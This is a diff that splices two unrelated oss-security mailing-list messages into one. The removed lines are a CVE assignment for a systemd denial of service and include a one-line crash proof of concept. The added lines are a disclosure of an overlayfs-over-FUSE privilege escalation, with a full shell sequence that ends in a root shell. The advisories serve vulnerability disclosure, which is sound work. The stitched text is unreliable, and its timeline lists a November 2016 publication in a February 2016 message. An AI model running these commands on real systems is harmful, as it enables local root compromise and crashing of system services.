@@ -1,65 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/1
-Message-Id: <20160930065202.8889413A978@smtpvmsrv1.mitre.org>
-Date: Fri, 30 Sep 2016 02:52:02 -0400 (EDT)
-From: cve-assign@...re.org
-To: agwa@...rewayer.name
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request: systemd v209+: local denial-of-service attack
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/24/8
+Message-ID: <f16c78c5-5666-5322-2807-b68a8e13356e@halfdog.net>
+Date: Wed, 24 Feb 2016 06:03:35 +0000
+From: halfdog <me@...fdog.net>
+To: oss-security@...ts.openwall.com
+Subject: Overlayfs over Fuse Privilege Escalation in USERNS
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hash: SHA1
 
-> https://github.com/systemd/systemd/issues/4234
-> https://www.agwa.name/blog/post/how_to_crash_systemd_in_one_tweet
+[http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/]
 
-> systemd fails an assertion in manager_invoke_notify_message when
-> a zero-length message is received over its notification socket.
-> After failing the assertion, PID 1 hangs in the pause system call.
-> It is no longer possible to start and stop daemons or cleanly reboot
-> the system. Inetd-style services managed by systemd no longer accept
-> connections.
-> 
-> Since the notification socket, /run/systemd/notify, is world-writable,
-> this allows a local user to perform a denial-of-service attack against
-> systemd.
-> 
-> Proof-of-concept:
-> 
->         NOTIFY_SOCKET=/run/systemd/notify systemd-notify ""
+Introduction:
+=============
 
-Use CVE-2016-7795.
+* Problem description:
+
+On Ubuntu Wily it is possible to place an USERNS overlayfs mount over
+a fuse mount. The fuse filesystem may contain SUID binaries, but those
+cannot be used to gain privileges due to nosuid mount options. But
+when touching such an SUID binary via overlayfs mount, this will
+trigger copy_up including all file attributes, thus creating a real
+SUID binary on the disk.
+Methods
+
+Basic exploitation sequence is:
+
+    Mount fuse filesystem exposing one world writable SUID binary
+    Create USERNS
+    Mount overlayfs on top of fuse
+    Open the SUID binary RDWR in overlayfs, thus triggering copy_up
+
+This can be archived, e.g.
+
+test# mkdir fuse
+test# mv SuidExec RealFile
+test# ./FuseMinimal fuse
+test# ./UserNamespaceExec -- /bin/bash
+root# mkdir mnt upper work
+root# mount -t overlayfs -o lowerdir=fuse,upperdir=upper,workdir=work
+overlayfs mnt
+root# touch mnt/file
+touch: setting times of ‘mnt/file’: Permission denied
+root# umount mnt
+root# exit
+test# fusermount -u fuse
+test# ls -al upper/file
+- -rwsr-xr-x 1 root root 9088 Jan 22 09:18 upper/file
+test# upper/file /bin/bash
+root# id
+uid=0(root) gid=100(users) groups=100(users)
 
 
->> https://github.com/systemd/systemd/issues/4234#issuecomment-250441246
+Results, Discussion:
+====================
 
->> Older distros are affected differently I think: no assertion is
->> triggered but manager_dispatch_notify_fd() still returns an error
->> which has the bad side effect to disable the notification handler
->> completely
+* Fixing the issue itself:
 
-Use CVE-2016-7796.
+In my opinion, fuse filesystem allowed pretending to have files with
+different UIDs/GIDs in the local mount namespace, but they never had
+those properties, those files would have, when really stored on local
+disk. So e.g., the SUID binaries lost their SUID-properties and the
+owner could also modify arbitrary file content, even if file
+attributes were pretending, that he does not have access - by having
+control over the fuse process simulating the filesystem, such access
+control is futile. That is also the reason, why no other user than the
+one mounting the filesystem may have rights to access it by default.
+
+Hence the workarounds should be to restrict access to fuse also only
+to the mount namespace where it was created.
+
+* Avoiding numerous namespace issues in future:
+
+In my opinion, enabing USERNS was a little too fast, as it exposes a
+lot of additional kernel code to users without any special
+capabilities in init-ns by using the elevated privileges within the
+container. This is also recognized by others, but there is dispute on
+the consequences to draw from that. See Patch to disable unprivileged
+userns ... on LKML [0].
+
+I completely second the request to have options to disable the USERNS
+layer as it depends on the system type, if USERNS is a net gain
+regarding security or a net loss. It should be a gain on systems,
+where it allows to perform critical operations within a containment, a
+use-case where chroots are used currently. Without USERNS, those
+operations are likely to be performed with SUID helpers in the init-ns
+or privilege separation might be dropped completely as the overhead is
+too large for efficient work procedures.
+
+On the other hand, systems where all processes have similar security
+level, e.g. as they all process the same data, further privilege
+separation is not easy. The USERNS support will add only new risks here.
+
+Timeline:
+=========
+
+* 20160117: Discovery, report at Launchpad [1]
+* 20160121: First feedback from Ubuntu, Seth Arnold alreay working on
+submitted but not yet accepted upstream patch
+* 20160121: Feedback: first patch does not seem sufficient
+* 20160122: Patch request to disable unprivileged userns due to this
+and other issues LKML [0]
+* 20160131: Bugfix by Seth Forshee available on Ubuntu Launchpad
+* 20160117: CVE-2016-1576 linked on Launchpad [2]
+* 20161122: CRD and publication
+
+
+References:
+===========
+
+[0] https://lkml.org/lkml/2016/1/22/7
+[1] https://bugs.launchpad.net/bugs/1535150
+[2] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1576
 
 - -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
+http://www.halfdog.net/
+PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1
 
-iQIcBAEBCAAGBQJX7gspAAoJEHb/MwWLVhi2AEYQAI5Dkd5GxOBYhdhVAfMnJ6Xs
-wkc8q9UDwm7dotGM4fnDy5noR0NEzi/+1d8v2F+i7WafNc1RCzvYlLL0W89UjAkj
-cz3LQ/DWAnF9PxWU8M2uRDmSanjDwESqTXmsTqapeXK+bY70qbVKpTVJLkItaFOj
-lW/43C7W6SVHNBhSly9DLUGzVbokd2kaHwnIDg0LGdeBdjd4aT9iKzGuN57JteQT
-cAMFVlcMrq+VyuQpisI4nzTdDxTQehdCe5r6L1d/AHn8UQ7rFE1hi6wGQCcZ+e3q
-SsIxPmno3oUUEfQiRqjlOy8LSUor7t1t/VlwlZeznGzIrH0YVSOtZ4DCnBiWbzgQ
-6AAaVk/L0MnSIRsVXyZLsIWtjOSFSWCP0A8lg5DB7mgabyHk6hWKM1lk/IHkuWOi
-ZsQDJuKMQT8ZDQJ+28ouxjCmc8nY9SpDqD2BM5qZEdqs9LWfzB6Jv/cFAcbeEJsi
-M8T+4GGb8TobihbyAZjebWPwtQIejObUgNpuVUMqOCYQypzPwYzqiVeAihfPynCY
-rG/bbD7LagaU5kUJA9w0w032pitwbA9i4yt4Bxw6BG3TfBAxAIb3GMJrYD2EX4Jv
-1jZrHbQ9bsshA01vo+ozm7hVZiL/J9GikM/mc+9vCeaDuwtcfLofKa+MskeFCw3w
-E5NYYC+/fcM2fQkTX1jM
-=XTWD
+iEYEARECAAYFAlbNR6wACgkQxFmThv7tq+70lwCfQh6+nQjTnK7NGDkSXSBJEP8o
+BnoAni1JcpmoV4s+NzqryJxKwZVTV3dO
+=FO71
 -----END PGP SIGNATURE-----
